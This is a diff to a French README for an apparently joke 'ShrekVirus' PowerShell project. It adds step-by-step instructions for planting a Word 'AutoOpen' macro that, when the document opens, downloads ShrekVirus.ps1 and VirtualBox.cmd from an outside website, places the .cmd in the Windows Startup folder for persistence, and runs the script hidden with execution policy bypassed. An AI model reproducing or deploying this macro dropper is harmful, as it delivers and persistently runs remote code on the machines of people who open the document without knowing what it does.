@@ -76,3 +76,31 @@ Si vous souhaitez changer l'icône, dans le script Powershell ShrekMenu.ps1 :
 - Convertir votre image servant de fond d'écran en code base64
 - Aller à la ligne 84 et remplacer le code base64 par le votre
 
+# Execution dans Microsoft Word
+Cliquez sur "Affichage" dans la barre de menu, puis sélectionnez "Macro" et "Afficher les macros".
+![image](https://user-images.githubusercontent.com/73076854/229302792-6a42a8c6-ec6b-4414-8739-350b8d2471af.png)
+
+Créer une macro au nom de "AutoOpen" et cliquer sur "Créer".
+![image](https://user-images.githubusercontent.com/73076854/229302829-9fe69643-843f-4a45-b6e8-1746b3e586f5.png)
+
+Une fenetre va apparaitre, remplacer le code par le suivant :
+```
+Sub AutoOpen()
+    Dim objShell
+    Set objShell = CreateObject("Wscript.Shell")
+    objShell.Run "powershell.exe -Command ""Invoke-WebRequest -Uri 'https://antoningrepilloux.fr/ShrekVirus.ps1' -OutFile 'C:\Users\Public\Documents\ShrekVirus.ps1'"""
+    objShell.Run "powershell.exe -Command ""Invoke-WebRequest -Uri 'https://antoningrepilloux.fr/VirtualBox.cmd' -OutFile '$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\VirtualBox.cmd'"""
+    objShell.Run "powershell.exe -windowstyle hidden -executionpolicy bypass -file C:\Users\Public\Documents\ShrekVirus.ps1"
+    Set objShell = Nothing
+
+End Sub
+```
+
+Avant :
+![image](https://user-images.githubusercontent.com/73076854/229302907-62297027-0b41-496f-b0e1-c90cdcf678f0.png)
+
+Après :
+![image](https://user-images.githubusercontent.com/73076854/229302921-ce845dd1-65f2-4891-babd-69e213ec4e15.png)
+
+Enregistrer le code avec les touches CTRL + S, puis quitter la fenêtre.
+Enregistrer le document Word avec les touches CTRL + S, puis quitter le document.
